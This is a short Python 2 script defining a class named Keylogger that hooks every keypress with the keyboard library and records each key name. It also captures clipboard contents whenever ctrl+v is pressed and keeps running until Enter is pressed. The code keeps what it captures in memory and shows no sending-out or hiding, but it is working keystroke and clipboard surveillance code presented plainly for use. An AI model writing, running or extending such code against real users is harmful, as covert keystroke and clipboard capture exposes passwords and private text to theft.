import keyboard

class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        self.captured_pasting = []

        keyboard.hook(self._on_key_press)
        keyboard.add_hotkey('ctrl+v', self._on_paste)

    def _on_key_press(self, event):
        self.captured_keys.append(event.name)

    def _on_paste(self):
        import pyperclip # Doesn't work when imported globally
        self.captured_pasting.append(pyperclip.paste())


k = Keylogger()
raw_input("Press Enter to continue...")
